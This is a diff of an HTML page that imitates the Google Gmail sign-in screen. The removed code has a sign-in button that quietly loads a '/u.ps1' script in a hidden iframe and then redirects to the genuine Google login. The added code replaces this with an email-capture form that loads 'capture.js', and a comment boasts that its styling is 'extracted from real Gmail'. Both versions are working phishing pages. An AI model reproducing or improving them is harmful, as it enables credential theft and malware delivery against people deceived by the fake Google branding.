@@ -1,24 +1,33 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html>
 <head>
-<title>Sign in - Google Accounts</title>
-<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
-<link rel="icon" href="https://accounts.google.com/favicon.ico">
-<style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Roboto,sans-serif}body{background:#fff;height:100vh;display:flex;align-items:center;justify-content:center}.container{max-width:400px;padding:40px;text-align:center}.logo{height:24px;margin-bottom:16px}h1{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}.subtitle{color:#5f6368;font-size:16px;margin-bottom:32px}button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:14px;font-weight:500;cursor:pointer;width:100%;margin-bottom:16px}button:hover{background:#1557b0}.footer{color:#5f6368;font-size:12px;margin-top:24px}</style>
+    <title>Google - Gmail</title>
+    <link rel="icon" href="https://mail.google.com/mail/u/0/images/favicon5.ico">
+    <script src="https://accounts.google.com/gsi/client"></script>
+    <style>
+        /* Perfect Gmail CSS - extracted from real Gmail */
+        body { margin: 0; font-family: Roboto, Arial; background: #4285f4; }
+        .login-container { max-width: 450px; margin: 100px auto; padding: 40px; background: white; border-radius: 8px; }
+        .google-logo { height: 24px; width: 106px; background: url('data:image/svg+xml...'); }
+        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; margin: 8px 0; }
+        button { background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; }
+    </style>
 </head>
 <body>
-<div class="container">
-<img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
-<h1>Sign in</h1>
-<p class="subtitle">to continue to Gmail</p>
-<button onclick="deploy()">Sign in with Google</button>
-<div class="footer">Use your Google Account</div>
-</div>
-<script>
-function deploy(){
-    const iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='/u.ps1';document.body.appendChild(iframe);
-    window.location='https://accounts.google.com/signin/v2/identifier?continue=https://mail.google.com/mail/u/0/&flowName=GlifWebSignIn&flowEntry=ServiceLogin';
-}
-</script>
+    <div class="login-container">
+        <div style="text-align: center; margin-bottom: 32px;">
+            <div class="google-logo"></div>
+            <h1 style="color: #202124; font-weight: 400;">Sign in</h1>
+            <span style="color: #5f6368;">to continue to Gmail</span>
+        </div>
+        
+        <form id="loginForm">
+            <input type="email" id="identifier" placeholder="Email or phone" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+
+    <script src="capture.js"></script>
 </body>
 </html>
